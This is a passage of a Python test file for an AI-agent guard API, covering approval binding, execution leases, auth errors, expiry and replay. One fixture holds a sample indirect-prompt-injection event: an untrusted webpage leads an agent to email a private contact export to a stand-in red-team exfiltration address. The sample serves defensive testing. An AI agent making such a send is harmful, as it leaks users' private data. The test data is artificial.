"""RTE-05 Preparation contract tests for strong approval binding.

This module intentionally exercises only Guard API/Core storage behavior.  The
LangGraph/OpenClaw invocation and receipt evidence lives in the Integration PR.
"""

from __future__ import annotations

import asyncio
import base64
import json
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, replace
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

import pytest
import httpx
from jsonschema import validate
from jsonschema.exceptions import ValidationError as JsonSchemaValidationError
from pydantic import ValidationError as PydanticValidationError

from agentguard_core import GuardEvent, PolicyBundle, RuleOverride
from agentguard_core.authority.models import TaskFact
from agentguard_core.security_context.projection import (
    ConsumptionIntent,
    consumption_intent_digest,
)
from guard_api.auth import ApiAuthError, AuthContext, CapabilityAuthService
from guard_api.errors import error_response
from guard_api.main import create_app
from guard_api.models import (
    EnforcementBinding,
    ExecutionLeaseConsumeRequest,
    ExecutionLeaseConsumeResponse,
)
from guard_api.settings import GuardApiSettings
from guard_api.security_state import SecurityStateService
from guard_api.security_state.lease_service import (
    ApprovalExecutionLeaseService,
    approval_execution_lease_service_from_settings,
    derive_lease_token,
)
from guard_api.services import (
    ApprovalService,
    AuditService,
    EvaluationService,
    PolicyService,
    ProvenanceWriter,
    V21PipelineService,
    V21ShadowService,
)
from guard_api.services.audit_window import AuditWindowService
from guard_api.services.trace import TraceService
from guard_api.storage.base import (
    ApprovalExecutionLeaseExpiredError,
    ApprovalExecutionLeaseStateInvalidError,
    ApprovalExecutionLeaseUnavailableError,
    ApprovalLeaseAuthorizationError,
    ApprovalLeaseConsumptionConflictError,
    ApprovalLeaseExpiredError,
    ApprovalLeaseNotConsumableError,
    TaskFactRecord,
)
from guard_api.storage.integrity import canonical_sha256
from guard_api.storage.memory import MemoryControlPlaneStore
from guard_api.storage.postgres import PostgresControlPlaneStore
import guard_api.storage.memory as memory_store_module
from guard_api.routers.approvals import approval_wait_payload
from tests.support.auth import add_adapter_credential, memory_store_with_adapter
from tests.support.postgres import get_test_database_url, reset_control_plane_schema

ROOT = Path(__file__).resolve().parents[1]
ADAPTER_TOKEN = "adapter-secret"
ADAPTER_HEADERS = {"Authorization": f"Bearer {ADAPTER_TOKEN}"}
CONTROL_TOKEN = "control-secret"
TASK_ID = "task_rte05_exact_binding"
SCOPE_DIGEST = "hmac-sha256:" + "5a" * 32
TASK_SCOPE_KEY_ID = "rte05-test-key"
TASK_SCOPE_KEY = "cnRlLTA1LXRhc2stc2NvcGUta2V5LW1hdGVyaWFsLTAwMDE="
V21_SECRET = base64.urlsafe_b64encode(
    b"rte-05-action-ir-fingerprint-test-secret"
).decode("ascii")


def _schema(name: str) -> dict:
    return json.loads((ROOT / "schemas" / name).read_text(encoding="utf-8"))


def _fingerprint(byte: str = "a") -> str:
    return "hmac-sha256:" + byte * 64


def _strong_settings(
    *,
    enabled: bool = True,
    approval_ttl_seconds: int = 900,
    storage_backend: str = "memory",
    database_url: str | None = None,
) -> GuardApiSettings:
    kwargs: dict[str, Any] = {}
    if database_url is not None:
        kwargs["database_url"] = database_url
    return GuardApiSettings(
        control_token=CONTROL_TOKEN,
        storage_backend=storage_backend,
        v21_shadow_enabled=True,
        v21_shadow_server_secret=V21_SECRET,
        task_scope_active_key_id=TASK_SCOPE_KEY_ID,
        task_scope_keys=json.dumps({TASK_SCOPE_KEY_ID: TASK_SCOPE_KEY}),
        rte05_strong_binding_enabled=enabled,
        approval_ttl_seconds=approval_ttl_seconds,
        **kwargs,
    )


def _task_fact() -> TaskFact:
    return TaskFact(
        task_id=TASK_ID,
        scope_digest=SCOPE_DIGEST,
        scope_key_id=TASK_SCOPE_KEY_ID,
        principal_id="cred_adapter_main",
        task_summary="RTE-05 exact binding fixture",
        task_digest="sha256:" + "c5" * 32,
        revision=1,
        status="active",
        action_constraints=[],
        resource_constraints=[],
        destination_constraints=[],
        created_sequence=None,
        producer="guard_api_task_ingress",
        authority="authoritative",
        evidence_refs=[],
    )


def _seed_task(store: Any) -> None:
    task = _task_fact()
    store.create_task_fact(
        TaskFactRecord(
            task_fact=task,
            canonical_payload=task.model_dump(mode="json"),
            request_digest=canonical_sha256(task.model_dump(mode="json")),
            expected_revision=0,
            created_at="2026-08-16T00:00:00+00:00",
        )
    )


def _ask_event(
    *,
    event_id: str = "evt_rte05_exact",
    call_id: str = "call_rte05_exact",
    task_id: str | None = TASK_ID,
    agent_id: str = "main",
) -> dict:
    metadata = {} if task_id is None else {"task_id": task_id}
    return {
        "schema_version": "0.3",
        "event_id": event_id,
        "event_type": "tool_call_proposed",
        "runtime": "langgraph",
        "trace_id": f"trace_{event_id}",
        "case_id": "RTE-05-API",
        "attack_type": "indirect_prompt_injection",
        "is_malicious": True,
        "timestamp": "2026-08-16T00:00:00+00:00",
        "pre_execution": True,
        "security_context": {
            "user_task": "Complete the visible web form only",
            "source_type": "webpage",
            "source_trust": "untrusted",
            "agent_id": agent_id,
        },
        "payload": {
            "tool": {
                "name": "send_email",
                "category": "message",
                "kind": "email_send",
                "call_id": call_id,
            },
            "arguments": {
                "to": "exfiltration-intake@red-team.agentguard.local",
                "subject": "contact export",
                "body": "private contact export",
            },
            "derived_resources": [],
        },
        "metadata": metadata,
    }


def _app_and_store(*, enabled: bool = True) -> tuple[Any, MemoryControlPlaneStore]:
    store = memory_store_with_adapter(token=ADAPTER_TOKEN)
    _seed_task(store)
    app = create_app(store=store, settings=_strong_settings(enabled=enabled))
    return app, store


def _route_endpoint(app: Any, path: str, method: str):
    for route in app.routes:
        if getattr(route, "path", None) == path and method in getattr(
            route, "methods", set()
        ):
            return route.endpoint
    raise AssertionError(f"route missing: {method} {path}")


def _asgi_post(
    app: Any,
    path: str,
    *,
    headers: dict[str, str],
    json_body: dict[str, Any],
) -> httpx.Response:
    """Exercise FastAPI request validation without TestClient's worker thread."""

    async def request() -> httpx.Response:
        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(
            transport=transport,
            base_url="http://rte05.test",
        ) as client:
            return await client.post(path, headers=headers, json=json_body)

    return asyncio.run(request())


def _state_counts(store: MemoryControlPlaneStore) -> tuple[int, int, int, int]:
    return (
        len(store.enforcement_bindings),
        len(store.capability_grants),
        len(store.grant_consumption_records),
        len(store.execution_lease_records),
    )


@pytest.fixture
def postgres_rig():
    """PostgreSQL 16 is authoritative; absent local configuration skips by convention."""

    database_url = get_test_database_url()
    reset_control_plane_schema(database_url)
    store = PostgresControlPlaneStore(database_url)
    store.initialize()
    try:
        yield _service_rig(
            store=store,
            settings=_strong_settings(
                storage_backend="postgres",
                database_url=database_url,
            ),
        )
    finally:
        reset_control_plane_schema(database_url)


def _postgres_authority_counts(store: PostgresControlPlaneStore) -> tuple[int, ...]:
    from sqlalchemy import func, select

    from guard_api.storage.postgres import execution_leases, grant_consumptions
    from guard_api.storage.sqlalchemy_models import (
        capability_grant_runtime,
        enforcement_bindings,
    )

    tables = (
        enforcement_bindings,
        capability_grant_runtime,
        grant_consumptions,
        execution_leases,
    )
    with store._read_session() as session:  # pyright: ignore[reportPrivateUsage]
        return tuple(
            int(session.execute(select(func.count()).select_from(table)).scalar_one())
            for table in tables
        )


def _postgres_authority_text(store: PostgresControlPlaneStore) -> str:
    from sqlalchemy import select

    from guard_api.storage.postgres import execution_leases, grant_consumptions
    from guard_api.storage.sqlalchemy_models import (
        capability_grant_runtime,
        enforcement_bindings,
    )

    with store._read_session() as session:  # pyright: ignore[reportPrivateUsage]
        rows = [
            session.execute(select(table)).all()
            for table in (
                enforcement_bindings,
                capability_grant_runtime,
                grant_consumptions,
                execution_leases,
            )
        ]
    return repr(rows)


def _expire_postgres_approval_authority(
    rig: _ServiceRig,
    *,
    approval_id: str,
) -> None:
    from sqlalchemy import update

    from guard_api.storage.sqlalchemy_models import (
        approval_requests,
        capability_grant_runtime,
    )

    approval = rig.store.get_approval(approval_id)
    binding = rig.store.get_enforcement_binding(approval_id)
    assert approval is not None
    assert binding is not None and binding.grant_id is not None
    # Satisfy expires_at > created_at while placing the whole authority chain
    # strictly before the next database NOW() read.
    expired_at = datetime.fromisoformat(approval.created_at) + timedelta(microseconds=1)
    with rig.store._session_factory() as session:  # pyright: ignore[reportPrivateUsage]
        with session.begin():
            session.execute(
                update(approval_requests)
                .where(approval_requests.c.approval_id == approval_id)
                .values(expires_at=expired_at)
            )
            session.execute(
                update(capability_grant_runtime)
                .where(capability_grant_runtime.c.grant_id == binding.grant_id)
                .values(expires_at=expired_at.isoformat())
            )


@dataclass(slots=True)
class _ServiceRig:
    store: Any
    settings: GuardApiSettings
    evaluation: EvaluationService
    approvals: ApprovalService
    leases: ApprovalExecutionLeaseService
    auth: CapabilityAuthService

    def evaluate(self, event: dict | None = None):
        return self.evaluation.evaluate(
            GuardEvent.model_validate(event or _ask_event()),
            requesting_principal_id="cred_adapter_main",
        )

    def auth_context(self, token: str = ADAPTER_TOKEN) -> AuthContext:
        return self.auth.verify_bearer(
            f"Bearer {token}",
            "approval:wait",
        )


def _service_rig(
    *,
    policy_bundle: PolicyBundle | None = None,
    enabled: bool = True,
    seed_task: bool = True,
    store: Any | None = None,
    settings: GuardApiSettings | None = None,
) -> _ServiceRig:
    if store is None:
        store = memory_store_with_adapter(token=ADAPTER_TOKEN)
    else:
        add_adapter_credential(store, token=ADAPTER_TOKEN)
    if seed_task:
        _seed_task(store)
    settings = settings or _strong_settings(enabled=enabled)
    state_service = SecurityStateService(store)
    provenance = ProvenanceWriter(store=store)
    audit = AuditService(store=store, provenance_writer=provenance)
    approvals = ApprovalService(
        store=store,
        settings=settings,
        provenance_writer=provenance,
        state_service=state_service,
    )
    policy = PolicyService(store=store, policy_bundle=policy_bundle)
    shadow = V21ShadowService(
        settings=settings,
        store=store,
        state_service=state_service,
    )
    pipeline = V21PipelineService(
        settings=settings,
        store=store,
        state_service=state_service,
        policy_service=policy,
    )
    evaluation = EvaluationService(
        policy_service=policy,
        audit_service=audit,
        approval_service=approvals,
        v21_shadow_service=shadow,
        v21_pipeline=pipeline,
    )
    return _ServiceRig(
        store=store,
        settings=settings,
        evaluation=evaluation,
        approvals=approvals,
        leases=approval_execution_lease_service_from_settings(
            store, settings, approvals
        ),
        auth=CapabilityAuthService(settings=settings, store=store),
    )


def _resolve_rig_allow_once(rig: _ServiceRig, approval_id: str) -> None:
    resolved = rig.approvals.resolve_approval(
        approval_id,
        "allow_once",
        resolution_source="human",
    )
    assert resolved.status == "resolved"
    assert resolved.decision == "allow_once"
    assert resolved.resolution_source == "human"


def _consume_rig(
    rig: _ServiceRig,
    response,
    *,
    action_id: str | None = None,
    authorization_fingerprint: str | None = None,
    auth_context: AuthContext | None = None,
    now: datetime | None = None,
):
    assert response.approval is not None
    assert response.enforcement_binding is not None
    binding = response.enforcement_binding
    return rig.leases.consume(
        response.approval.approval_id,
        action_id=action_id or binding.action_id,
        authorization_fingerprint=(
            authorization_fingerprint or binding.authorization_fingerprint
        ),
        auth_context=auth_context or rig.auth_context(),
        now=now,
    )


def _consume_route_for_rig(rig: _ServiceRig):
    app = create_app(store=rig.store, settings=rig.settings)
    return _route_endpoint(
        app,
        "/v1/approvals/{approval_id}/execution-leases/consume",
        "POST",
    )


def _assert_route_error(
    call,
    *,
    status_code: int,
    code: str,
    excluded_secrets: tuple[str, ...] = (),
) -> None:
    with pytest.raises(ApiAuthError) as excinfo:
        call()
    assert excinfo.value.status_code == status_code
    assert excinfo.value.code == code
    rendered = error_response(code, status_code=status_code)
    body = json.loads(rendered.body)
    assert body["error"]["code"] == code
    assert body["error"]["details"] == []
    body_text = rendered.body.decode("utf-8")
    for secret in excluded_secrets:
        assert secret not in body_text


def test_rte05_public_models_and_json_schemas_are_exact_and_extra_forbid() -> None:
    binding_payload = {
        "schema_version": "2.1",
        "action_id": "call_exact",
        "authorization_fingerprint": _fingerprint("a"),
        "runtime_binding_id": "binding:cred_adapter_main",
        "requires_execution_lease": True,
    }
    request_payload = {
        "action_id": "call_exact",
        "authorization_fingerprint": _fingerprint("a"),
    }
    response_payload = {
        "lease_id": "lease_exact",
        "consumption_id": "consume_exact",
        "lease_token": "lease-token-only-public-on-success",
        "expires_at": "2026-08-16T00:05:00+00:00",
    }

    assert set(EnforcementBinding.model_validate(binding_payload).model_dump()) == {
        "schema_version",
        "action_id",
        "authorization_fingerprint",
        "runtime_binding_id",
        "requires_execution_lease",
    }
    assert set(
        ExecutionLeaseConsumeRequest.model_validate(request_payload).model_dump()
    ) == {"action_id", "authorization_fingerprint"}
    assert set(
        ExecutionLeaseConsumeResponse.model_validate(response_payload).model_dump()
    ) == {"lease_id", "consumption_id", "lease_token", "expires_at"}

    validate(binding_payload, _schema("enforcement_binding.schema.json"))
    validate(
        request_payload,
        _schema("execution_lease_consume_request.schema.json"),
    )
    validate(
        response_payload,
        _schema("execution_lease_consume_response.schema.json"),
    )

    for model, payload in (
        (EnforcementBinding, binding_payload),
        (ExecutionLeaseConsumeRequest, request_payload),
        (ExecutionLeaseConsumeResponse, response_payload),
    ):
        with pytest.raises(PydanticValidationError):
            model.model_validate({**payload, "internal_grant_id": "must-not-leak"})

    for schema_name, payload in (
        ("enforcement_binding.schema.json", binding_payload),
        ("execution_lease_consume_request.schema.json", request_payload),
        ("execution_lease_consume_response.schema.json", response_payload),
    ):
        with pytest.raises(JsonSchemaValidationError):
            validate(
                {**payload, "internal_grant_id": "must-not-leak"}, _schema(schema_name)
            )

    for caller_field in (
        "grant_id",
        "scope",
        "runtime_binding",
        "token",
        "ttl",
    ):
        forbidden_request = {**request_payload, caller_field: "caller-controlled"}
        with pytest.raises(PydanticValidationError):
            ExecutionLeaseConsumeRequest.model_validate(forbidden_request)
        with pytest.raises(JsonSchemaValidationError):
            validate(
                forbidden_request,
                _schema("execution_lease_consume_request.schema.json"),
            )


@pytest.mark.parametrize(
    ("authorization", "expected_status", "expected_code", "raw_secret"),
    (
        (
            "Basic malformed-rte05-secret",
            401,
            "TOKEN_INVALID",
            "malformed-rte05-secret",
        ),
        ("Bearer unknown-rte05-secret", 401, "TOKEN_INVALID", "unknown-rte05-secret"),
        (f"Bearer {CONTROL_TOKEN}", 403, "SCOPE_DENIED", CONTROL_TOKEN),
    ),
    ids=("malformed-bearer", "unknown-bearer", "control-missing-scope"),
)
def test_consume_route_auth_failures_are_exact_and_zero_write(
    authorization: str,
    expected_status: int,
    expected_code: str,
    raw_secret: str,
) -> None:
    app, store = _app_and_store(enabled=True)
    endpoint = _route_endpoint(
        app,
        "/v1/approvals/{approval_id}/execution-leases/consume",
        "POST",
    )
    fingerprint = _fingerprint("d")
    before = _state_counts(store)
    payload = ExecutionLeaseConsumeRequest(
        action_id="call_auth_probe",
        authorization_fingerprint=fingerprint,
    )

    with pytest.raises(ApiAuthError) as excinfo:
        endpoint(
            approval_id="app_auth_probe",
            payload=payload,
            authorization=authorization,
        )
    assert excinfo.value.status_code == expected_status
    assert excinfo.value.code == expected_code
    rendered = error_response(expected_code, status_code=expected_status)
    assert json.loads(rendered.body) == {
        "error": {
            "code": expected_code,
            "message": (
                "Bearer token is invalid."
                if expected_code == "TOKEN_INVALID"
                else "Bearer token does not include the required scope."
            ),
            "details": [],
        }
    }
    assert _state_counts(store) == before
    assert raw_secret.encode() not in rendered.body
    assert fingerprint.encode() not in rendered.body


@pytest.mark.parametrize(
    "caller_field",
    ("grant_id", "scope", "runtime_binding", "token", "ttl"),
)
def test_consume_route_rejects_each_forbidden_caller_field_with_422(
    caller_field: str,
) -> None:
    app, store = _app_and_store(enabled=True)
    fingerprint = _fingerprint("e")
    forbidden_value = f"caller-controlled-{caller_field}"
    before = _state_counts(store)

    response = _asgi_post(
        app,
        "/v1/approvals/app_extra_probe/execution-leases/consume",
        headers=ADAPTER_HEADERS,
        json_body={
            "action_id": "call_extra_probe",
            "authorization_fingerprint": fingerprint,
            caller_field: forbidden_value,
        },
    )

    assert response.status_code == 422
    assert response.json() == {
        "error": {
            "code": "VALIDATION_ERROR",
            "message": "Request validation failed.",
            "details": [
                {
                    "loc": ["body", caller_field],
                    "msg": "Extra inputs are not permitted",
                    "type": "extra_forbidden",
                }
            ],
        }
    }
    assert _state_counts(store) == before
    assert forbidden_value not in response.text
    assert fingerprint not in response.text


def test_flag_off_consume_authenticates_then_503_without_writes() -> None:
    app, store = _app_and_store(enabled=False)
    endpoint = _route_endpoint(
        app,
        "/v1/approvals/{approval_id}/execution-leases/consume",
        "POST",
    )
    payload = ExecutionLeaseConsumeRequest(
        action_id="call_missing",
        authorization_fingerprint=_fingerprint("b"),
    )

    with pytest.raises(ApiAuthError) as missing_auth:
        endpoint(approval_id="app_missing", payload=payload, authorization=None)
    assert missing_auth.value.status_code == 401
    assert missing_auth.value.code == "AUTH_MISSING"
    before = _state_counts(store)
    with pytest.raises(ApiAuthError) as disabled:
        endpoint(
            approval_id="app_missing",
            payload=payload,
            authorization=ADAPTER_HEADERS["Authorization"],
        )
    assert disabled.value.status_code == 503
    assert disabled.value.code == "EXECUTION_LEASE_UNAVAILABLE"
    assert _state_counts(store) == before


def test_flag_off_evaluate_wire_keyset_and_replay_stay_c1() -> None:
    app, store = _app_and_store(enabled=False)
    endpoint = _route_endpoint(app, "/v1/guard/evaluate", "POST")
    event = _ask_event(event_id="evt_rte05_flag_off", call_id="call_flag_off")

    first = endpoint(
        payload=GuardEvent.model_validate(event),
        authorization=ADAPTER_HEADERS["Authorization"],
    )
    replay = endpoint(
        payload=GuardEvent.model_validate(event),
        authorization=ADAPTER_HEADERS["Authorization"],
    )

    assert json.dumps(first, sort_keys=True, separators=(",", ":")) == json.dumps(
        replay, sort_keys=True, separators=(",", ":")
    )
    assert set(first) == {"decision", "approval", "policy_audit_id"}
    assert "enforcement_binding" not in first
    assert store.enforcement_bindings == {}


def test_flag_on_only_eligible_phase_b_valid_ask_emits_exact_replay_binding() -> None:
    rig = _service_rig()
    event = _ask_event(event_id="evt_rte05_binding", call_id="call_rte05_binding")

    first = rig.evaluate(event)
    replay = rig.evaluate(event)

    assert first.decision.decision == "ask"
    assert first.approval is not None
    assert first.enforcement_binding is not None
    binding = first.enforcement_binding
    assert set(binding.model_dump(mode="json")) == {
        "schema_version",
        "action_id",
        "authorization_fingerprint",
        "runtime_binding_id",
        "requires_execution_lease",
    }
    assert binding.schema_version == "2.1"
    assert binding.action_id == "call_rte05_binding"
    assert binding.authorization_fingerprint.startswith("hmac-sha256:")
    assert binding.runtime_binding_id == "binding:cred_adapter_main"
    assert binding.requires_execution_lease is True
    assert replay.model_dump(mode="json") == first.model_dump(mode="json")

    private = rig.store.get_enforcement_binding(first.approval.approval_id)
    assert private is not None
    assert private.action_id == binding.action_id
    assert private.authorization_fingerprint == binding.authorization_fingerprint
    assert private.runtime_binding_id == binding.runtime_binding_id
    audit = rig.store.get_policy_evaluation_by_event_id(event["event_id"])
    assert audit is not None
    decision_v21 = audit.evidence["decision_v21"]["payload"]
    # A binding is only eligible after the authoritative, non-degraded Phase B
    # path.  The public audit keeps that fact but never the private fingerprint.
    assert decision_v21["divergence_category"] is None
    assert decision_v21["degradation_ids"] == []
    assert binding.authorization_fingerprint not in json.dumps(
        audit.model_dump(mode="json"), sort_keys=True
    )


def test_flag_on_degraded_ask_and_official_deny_never_emit_binding() -> None:
    degraded = _service_rig(seed_task=False)
    degraded_response = degraded.evaluate(
        _ask_event(
            event_id="evt_rte05_degraded",
            call_id="call_rte05_degraded",
            task_id=None,
        )
    )
    assert degraded_response.decision.decision == "ask"
    assert degraded_response.enforcement_binding is None
    assert degraded.store.enforcement_bindings == {}

    deny = _service_rig(
        policy_bundle=PolicyBundle(
            rule_overrides={
                "P005_external_send": RuleOverride(
                    decision="deny", risk_score=90, severity="high"
                ),
                "P004_task_mismatch": RuleOverride(
                    decision="deny", risk_score=90, severity="high"
                ),
            }
        )
    )
    deny_response = deny.evaluate(
        _ask_event(event_id="evt_rte05_deny", call_id="call_rte05_deny")
    )
    assert deny_response.decision.decision == "deny"
    assert deny_response.approval is None
    assert deny_response.enforcement_binding is None
    assert deny.store.enforcement_bindings == {}


def test_evaluation_failure_after_private_binding_write_rolls_back_all_authority(
    monkeypatch,
) -> None:
    rig = _service_rig()
    original = MemoryControlPlaneStore.save_enforcement_binding

    def _save_then_fail(self, record):
        original(self, record)
        raise RuntimeError("simulated post-binding evaluation failure")

    monkeypatch.setattr(
        MemoryControlPlaneStore,
        "save_enforcement_binding",
        _save_then_fail,
    )
    event = _ask_event(event_id="evt_rte05_rollback", call_id="call_rte05_rollback")

    with pytest.raises(RuntimeError, match="post-binding"):
        rig.evaluate(event)

    assert rig.store.get_policy_evaluation_by_event_id(event["event_id"]) is None
    assert rig.store.approvals == {}
    assert rig.store.enforcement_bindings == {}
    assert rig.store.provenance_nodes == {}
    assert rig.store.provenance_edges == {}


def test_memory_exact_consume_success_and_valid_replay_return_same_token_and_ids() -> (
    None
):
    rig = _service_rig()
    response = rig.evaluate()
    assert response.approval is not None
    assert response.enforcement_binding is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)

    first = _consume_rig(rig, response)
    replay = _consume_rig(rig, response)

    public = ExecutionLeaseConsumeResponse(
        lease_id=first.lease.lease_id,
        consumption_id=first.consumption.consumption_id,
        lease_token=first.lease_token,
        expires_at=first.lease.expires_at,
    ).model_dump(mode="json")
    assert set(public) == {
        "lease_id",
        "consumption_id",
        "lease_token",
        "expires_at",
    }
    validate(public, _schema("execution_lease_consume_response.schema.json"))
    assert first.replayed is False
    assert replay.replayed is True
    assert replay.lease.lease_id == first.lease.lease_id
    assert replay.consumption.consumption_id == first.consumption.consumption_id
    assert replay.lease_token == first.lease_token

    binding = rig.store.get_enforcement_binding(response.approval.approval_id)
    assert binding is not None and binding.grant_id is not None
    grant = rig.store.get_capability_grant_runtime(binding.grant_id)
    assert grant is not None
    assert grant["remaining_uses"] == 0
    assert (
        grant["expires_at"]
        == rig.store.get_approval(response.approval.approval_id).expires_at
    )
    assert len(rig.store.grant_consumption_records) == 1
    assert len(rig.store.execution_lease_records) == 1
    stored_lease = next(iter(rig.store.execution_lease_records.values()))
    assert stored_lease.token_digest.startswith("sha256:")
    assert stored_lease.token_digest != first.lease_token
    assert first.lease_token not in repr(rig.store.execution_lease_records)
    assert first.lease_token not in repr(rig.store.grant_consumption_records)
    assert first.lease_token not in repr(rig.store.capability_grants)


@pytest.mark.parametrize("drift", ["action", "fingerprint"])
def test_action_or_fingerprint_drift_conflicts_without_consumption(drift: str) -> None:
    rig = _service_rig()
    response = rig.evaluate()
    assert response.approval is not None
    assert response.enforcement_binding is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)
    binding = rig.store.get_enforcement_binding(response.approval.approval_id)
    assert binding is not None and binding.grant_id is not None

    kwargs: dict[str, str] = {}
    if drift == "action":
        kwargs["action_id"] = f"{response.enforcement_binding.action_id}-drift"
    else:
        kwargs["authorization_fingerprint"] = _fingerprint("d")

    with pytest.raises(ApprovalLeaseConsumptionConflictError):
        _consume_rig(rig, response, **kwargs)

    grant = rig.store.get_capability_grant_runtime(binding.grant_id)
    assert grant is not None and grant["remaining_uses"] == 1
    assert rig.store.grant_consumption_records == {}
    assert rig.store.execution_lease_records == {}


def test_approval_and_valid_lease_expiry_are_distinct_410_conditions() -> None:
    approval_rig = _service_rig()
    approval_response = approval_rig.evaluate(
        _ask_event(event_id="evt_rte05_approval_expiry", call_id="call_approval_expiry")
    )
    assert approval_response.approval is not None
    _resolve_rig_allow_once(approval_rig, approval_response.approval.approval_id)
    approval = approval_rig.store.get_approval(approval_response.approval.approval_id)
    assert approval is not None
    after_approval_expiry = datetime.fromisoformat(approval.expires_at) + timedelta(
        seconds=1
    )
    approval_rig.store.audit_clock = lambda: after_approval_expiry
    with pytest.raises(ApprovalLeaseExpiredError):
        _consume_rig(
            approval_rig,
            approval_response,
            now=after_approval_expiry,
        )
    assert approval_rig.store.grant_consumption_records == {}
    assert approval_rig.store.execution_lease_records == {}

    lease_rig = _service_rig()
    lease_response = lease_rig.evaluate(
        _ask_event(event_id="evt_rte05_lease_expiry", call_id="call_lease_expiry")
    )
    assert lease_response.approval is not None
    _resolve_rig_allow_once(lease_rig, lease_response.approval.approval_id)
    issued_at = datetime.now(timezone.utc)
    lease_rig.store.audit_clock = lambda: issued_at
    first = _consume_rig(lease_rig, lease_response, now=issued_at)
    after_lease_expiry = datetime.fromisoformat(first.lease.expires_at) + timedelta(
        seconds=1
    )
    lease_rig.store.audit_clock = lambda: after_lease_expiry
    with pytest.raises(ApprovalExecutionLeaseExpiredError):
        _consume_rig(lease_rig, lease_response, now=after_lease_expiry)
    lease_approval = lease_rig.store.get_approval(lease_response.approval.approval_id)
    assert lease_approval is not None
    after_bound_approval_expiry = datetime.fromisoformat(
        lease_approval.expires_at
    ) + timedelta(seconds=1)
    lease_rig.store.audit_clock = lambda: after_bound_approval_expiry
    # Once a consumption exists, expiry is an execution-lease terminal fact;
    # it must not be relabelled as a fresh/unconsumed approval expiry.
    with pytest.raises(ApprovalExecutionLeaseExpiredError):
        _consume_rig(
            lease_rig,
            lease_response,
            now=after_bound_approval_expiry,
        )
    assert len(lease_rig.store.grant_consumption_records) == 1
    assert len(lease_rig.store.execution_lease_records) == 1


@pytest.mark.parametrize(
    ("decision", "resolution_source"),
    [
        (None, None),
        ("deny", "human"),
        ("allow_once", "system"),
        ("allow_once", "llm"),
    ],
)
def test_pending_deny_system_and_llm_allow_once_are_not_consumable(
    decision: str | None,
    resolution_source: str | None,
) -> None:
    rig = _service_rig()
    response = rig.evaluate(
        _ask_event(
            event_id=f"evt_rte05_nonhuman_{decision}_{resolution_source}",
            call_id=f"call_nonhuman_{decision}_{resolution_source}",
        )
    )
    assert response.approval is not None
    if decision is not None:
        rig.store.resolve_approval(
            response.approval.approval_id,
            decision,
            resolution_source=resolution_source,
        )

    with pytest.raises(ApprovalLeaseNotConsumableError):
        _consume_rig(rig, response)
    assert rig.store.grant_consumption_records == {}
    assert rig.store.execution_lease_records == {}


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("principal_id", "principal_other"),
        ("runtime", "openclaw"),
        ("agent_id", "agent_other"),
    ],
)
def test_wrong_principal_runtime_or_agent_is_forbidden(field: str, value: str) -> None:
    rig = _service_rig()
    response = rig.evaluate()
    assert response.approval is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)
    context = replace(rig.auth_context(), **{field: value})

    with pytest.raises(ApprovalLeaseAuthorizationError):
        _consume_rig(rig, response, auth_context=context)
    assert rig.store.grant_consumption_records == {}
    assert rig.store.execution_lease_records == {}


@pytest.mark.parametrize("credential_state", ["revoked", "expired"])
def test_credential_is_rechecked_inside_consume_transaction(
    credential_state: str,
) -> None:
    rig = _service_rig()
    response = rig.evaluate()
    assert response.approval is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)
    context = rig.auth_context()
    assert context.credential_id is not None
    credential = rig.store.credentials[context.credential_id]
    if credential_state == "revoked":
        rig.store.revoke_credential(
            context.credential_id,
            datetime.now(timezone.utc).isoformat(),
        )
    else:
        rig.store.credentials[context.credential_id] = credential.model_copy(
            update={"expires_at": "2020-01-01T00:00:00+00:00"}
        )

    with pytest.raises(ApprovalLeaseAuthorizationError):
        _consume_rig(rig, response, auth_context=context)
    assert rig.store.grant_consumption_records == {}
    assert rig.store.execution_lease_records == {}


def test_missing_registration_returns_503_then_exact_retry_recovers() -> None:
    rig = _service_rig()
    response = rig.evaluate()
    assert response.approval is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)
    binding = rig.store.get_enforcement_binding(response.approval.approval_id)
    assert binding is not None and binding.grant_id is not None
    rig.store.capability_grants.clear()
    rig.store.enforcement_bindings[binding.approval_id] = replace(
        binding, grant_id=None
    )

    with pytest.raises(ApprovalExecutionLeaseUnavailableError):
        _consume_rig(rig, response)
    assert rig.store.grant_consumption_records == {}
    assert rig.store.execution_lease_records == {}
    recovered = rig.store.get_enforcement_binding(response.approval.approval_id)
    assert recovered is not None and recovered.grant_id is not None

    result = _consume_rig(rig, response)
    assert result.replayed is False
    assert len(rig.store.grant_consumption_records) == 1
    assert len(rig.store.execution_lease_records) == 1


def test_expired_approval_with_missing_registration_is_terminal_410() -> None:
    rig = _service_rig()
    response = rig.evaluate(
        _ask_event(
            event_id="evt_rte05_expired_missing_registration",
            call_id="call_expired_missing_registration",
        )
    )
    assert response.approval is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)
    binding = rig.store.get_enforcement_binding(response.approval.approval_id)
    assert binding is not None and binding.grant_id is not None
    rig.store.capability_grants.clear()
    rig.store.enforcement_bindings[binding.approval_id] = replace(
        binding, grant_id=None
    )
    approval = rig.store.get_approval(response.approval.approval_id)
    assert approval is not None
    after_expiry = datetime.fromisoformat(approval.expires_at) + timedelta(seconds=1)

    with pytest.raises(ApprovalLeaseExpiredError):
        _consume_rig(rig, response, now=after_expiry)

    recovered = rig.store.get_enforcement_binding(response.approval.approval_id)
    assert recovered is not None and recovered.grant_id is None
    assert rig.store.capability_grants == {}
    assert rig.store.grant_consumption_records == {}
    assert rig.store.execution_lease_records == {}


def test_registration_conflict_fails_closed_without_partial_consumption() -> None:
    rig = _service_rig()
    response = rig.evaluate()
    assert response.approval is not None
    _resolve_rig_allow_once(rig, response.approval.approval_id)
    binding = rig.store.get_enforcement_binding(response.approval.approval_id)
    assert binding is not None and binding.grant_id is not None
    rig.store.capability_grants[binding.grant_id]["authorization_fingerprint"] = (
        _fingerprint("e")
    )

    with pytest.raises(ApprovalExecutionLeaseStateInvalidError):
        _consume_rig(rig, response)
    assert rig.store.capability_grants[binding.grant_id]["remaining_uses"] == 1
    assert rig.store.grant_consumption_records == {}
    assert rig.store.execution_lease_records == {}


def test_concurrent_same_key_consumes_once_and_replays_one_authority_fact() -> None:
    rig = _service_rig()
